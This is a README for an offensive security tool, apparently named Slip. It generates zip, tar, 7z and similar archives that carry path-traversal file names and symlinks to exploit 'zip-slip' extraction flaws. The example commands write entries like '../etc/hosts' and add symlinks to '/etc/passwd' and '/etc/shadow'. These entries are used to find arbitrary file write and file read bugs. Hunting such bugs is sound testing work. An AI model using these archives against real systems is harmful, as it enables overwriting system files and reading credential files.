# Slip

Slip is a malicious archive generator to exploit path traversal vulnerabilities.

Slip makes it easy to create multiple archives containing path traversal payloads in file name fields, rendering the extraction of the archive a potentially dangerous operation. With this approach it is possible to find and exploit "[zip-slip](https://security.snyk.io/research/zip-slip-vulnerability)" type vulnerabilities.

## Motivation

Most commonly used tools rarely support path traversal payloads in archives, this makes it hard and time consuming to create malicious archives when attempting to find vulnerabilities in a software. With slip it's really convenient to create highly customizable archives that fit most situations.

## Features

Slip is a feature rich script capable of satisfying most "zip-slip" hunting needs, in particular the script:

- Supports **zip**, **tar**, **7z** and **zip-like** (jar, war, apk, ipa, ...) archives 
- Allows to hunt for **arbitrary file write** and **arbitrary file read** vulnerabilities 
- Supports the generation of path traversal payloads to search for a file at different depths in the filesystem
- Implements a massfind mode, that uses a payload dictionary to generate the archive
- Allows cloning existing archives to add malicious payloads in more complex existing archives 

## Getting started

### Installation
Clone the repo, install the requirements (`pip install -r requirements.txt`) and you're good to go!

### Usage
```
Usage: slip.py [OPTIONS] ARCHIVE_NAME

  Script to generate "zipslip" and "zip symlink" archives.

  ARCHIVE-NAME is the name of the archive to be created.

Options:
  -a, --archive-type [zip|tar||jar|war|apk|ipa]
                                  Type of the archive.  [default: zip]
  -c, --clone TEXT                Archive to clone. It creates a copy of an
                                  existing archive and opens to allow adding
                                  payloads.
  -j, --json-file TEXT            JSON file containing a list of file
                                  definitions.
  -p, --paths TEXT                Comma separated paths to include in the
                                  archive.
  -s, --symlinks TEXT             Comma separated symlinks to include in the
                                  archive. To name a symlink use the syntax:
                                  path;name
  --file-content TEXT             Content of the files in the archive, file-
                                  content must be specified if -p/--paths is
                                  used.
  --search INTEGER                Maximum depth in path traversal payloads,
                                  this option generates payload to traverse
                                  multiple depths. It applies to all symlinks
                                  and paths.  [default: 0]
  --dotdotslash TEXT              Dot dot slash sequence to use in search
                                  mode.  [default: ../]
  --mass-find TEXT                Name of the file to find. It will create an
                                  archive with numerous path traversal
                                  payloads aimed to find the specified file
                                  name. WARNING: it uses A LOT of payloads,
                                  use with caution.
  --mass-find-mode [paths|symlinks]
                                  Mass-find mode to use  [default: symlinks]
  --mass-find-dict FILENAME       Mass-find payload dictionary  [default:
                                  dict.txt]
  --mass-find-placeholder TEXT    Filename placeholder in mass-find payload
                                  dictionary  [default: {FILE}]
  --compression [none|deflate|bzip2|lzma|lzma2|ppmd|brotli|zstandard|copy]
                                  Compression algorithm to use in the archive.
  -v, --verbose                   Verbosity trigger.
  --help                          Show this message and exit.

```

### Usage example

Create a tar.bz2 archive containing 2 explicit paths: 
```
python3 slip.py --archive-type tar --compression bzip2 --paths "../etc/hosts, ../../etc/hosts" --file-content "foo" archive.tar
```

Create a zip archive containing an explicit path and an explicit symlink: 
```
python3 slip.py --archive-type zip --compression deflate --paths "../etc/hosts" --symlinks "../etc/shadows" --file-content "foo" archive.zip
```

Create a 7z archive with a named symlink:
```
python3 slip.py --archive-type 7z --symlinks "../etc/hosts;linkname" archive.7z  
```
This technique is really useful in case directory traversal payloads are filtered in paths but not in symlink, as it would be possible to achieve an arbitrary write file referring to the named symlink as parth of the path (e.g. symlink: `../etc/;foo`, path: `foo/hosts`).

Create an archive from an existing one and add a new payload:
```
python3 slip.py --clone source.7z --paths "foo" --file-content "bar" archive.7z
```

Create an archive from a JSON file and add new payloads:
```
python3 slip.py --json-file definition.json --paths "foo0,bar00" --symlinks "/etc/passwd,/etc/shadow" --file-content "buzz" archive.zip
```

With `definition.json` containing:
```
[
    {
        "file-name": "../foo1",
        "content":"bar",
        "type":"path"
    },
    {
        "file-name": "../../foo2",
        "content":"bar",
        "type":"path"
    },
    {
        "file-name": "/etc/passwd;foo3",
        "content":"IGNORED",
        "type":"symlink"
    },
    {
        "file-name": "foo4",
        "content":"Y2lhbwo=",
        "base64": true,
        "type":"path"
    }
]
```
Supported fields are `file-name`, `content`, `base64`, `type`.
If `base64` is specified, content will be decoded form base64.
`type` can only be `path` or `symlink`.

Create a tar.bz2 archive with 4 payloads to search for "config.ini" at 3 different depths (it also uses Windows flavor dot dot slash): 
```
python3 slip.py --archive-type tar --compression bzip2 --paths "config.ini" --search 3 --dotdotslash "..\\" --file-content "foo" archive.tar
```
The archive will contain:
```
config.ini
..\config.ini
..\..\config.ini
..\..\..\config.ini
```
NOTE: --search does not support named symlink usage to prevent named symlinks from overwriting eachother. 

Create a tar archive with payloads from the default mass-find dictionary to find the `/etc/host/` file:
```
python3 slip.py --archive-type tar --mass-find "/etc/hosts" --mass-find-mode symlinks archive.tar
```

## License
This project is licensed under the GPL-3.0 [License](https://github.com/0xless/slip/blob/main/LICENSE).
